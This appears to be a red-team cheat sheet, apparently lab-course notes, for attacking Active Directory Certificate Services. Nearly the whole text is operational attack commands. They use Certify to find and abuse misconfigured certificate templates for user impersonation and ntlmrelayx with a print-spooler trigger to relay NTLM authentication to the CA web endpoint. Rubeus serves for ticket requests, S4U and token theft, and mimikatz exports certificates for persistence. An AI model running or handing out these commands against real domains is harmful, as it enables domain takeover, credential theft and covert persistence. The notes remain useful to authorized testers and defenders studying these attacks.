# Active Directory Certificate Services (ADCS)

## Enumerate ADCS

# Finding Certificate Authorities

    beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas

# Miconfigured Certificate template

    beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable

# Attack Case 1: _ENROLLEE_SUPPLIES_SUBJECT_

    beacon> getuid
    beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb

    ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

    ubuntu@DESKTOP-3BSK7NO ~> cat cert.pfx | base64 -w 0

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:<password> /nowrap

# Attack Case 2 : NTLMRelay on CA web endpoint

# NTLM Relaying to ADCS HTTP Endpoints

- Web End point for certificate services is at http[s]://<hostname>/certsrv.
- Redirect the NTLM auth traffic using PrintSpool attack from DC to CA (if services running on seperate system) to fetch the DC Certificate
- But if they are both running on same server then we can execute the attack targetting a system where unconstrained delegation (WEB) is allowed, and force it to authenticate with CA to capture its certificate
- Do the same setup for ntlmrelayx and use print spooler to force DC/WEB to authenticate with wkstn2

1. Setup socks proxy (beacon session)

        beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging

2. Setup Proxychains to use this proxy

        $ sudo vim /etc/proxychains.conf
        socks5 127.0.0.1 1080 socks_user socks_password

3. Execute NTLMRelayx to target the certificate server endpoint

        attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

4. Setup reverse port forwarding (System shell)

        beacon> rportfwd 8445 127.0.0.1 445

5. Upload PortBender driver and load its cna file (System shell)

        beacon> cd C:\Windows\system32\drivers
        beacon> upload C:\Tools\PortBender\WinDivert64.sys
        beacon> PortBender redirect 445 8445

6. Use PrintSpool attack to force WEB (unconstrained) server to authenticate with wkstn 2 (Domain Sesion)

        beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102

7. Use the Base64 encoded machine certificate obtained to get TGT of machine account

        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /nowrap

8. Use the TGT ticket obtained for S4U attack to get a service ticket

        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

9. Inject the Service Ticket by creating a new sacrificial token

        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

10. Steal token and access the service

        beacon> steal_token 1234
        beacon> ls \\web.dev.cyberbotic.io\c$

# ADCS Persistence

## User Persistance

1. Enumerate user certificate from their Personal Certificate store (execute from user session)

        beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates

2. Export the certificate as DER and PFX file on disk

        beacon> mimikatz crypto::certificates /export

3. Encode the PFX file to be used with Rubeus

        ubuntu@DESKTOP-3BSK7NO ~> cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0

4. Use certificate to request TGT for the user (/enctype:aes256 - Better OPSEC)

        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIINeg[...]IH0A== /password:mimikatz /enctype:aes256 /nowrap

5. if certificate is not present then requst from his loggedin session and then follow above steps

        beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User

## Computer Persistance 

1. Export the machine certificate (requires elevated session)

        beacon> mimikatz !crypto::certificates /systemstore:local_machine /export

2. Encode the certificate, and use it to get TGT for machine account

        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIINCA[...]IH0A== /password:mimikatz /nowrap

3. If machine certificate it not stored, we can requet it using Certify (/machine param is required for auto elevation to system privilege)

        beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:Machine /machine
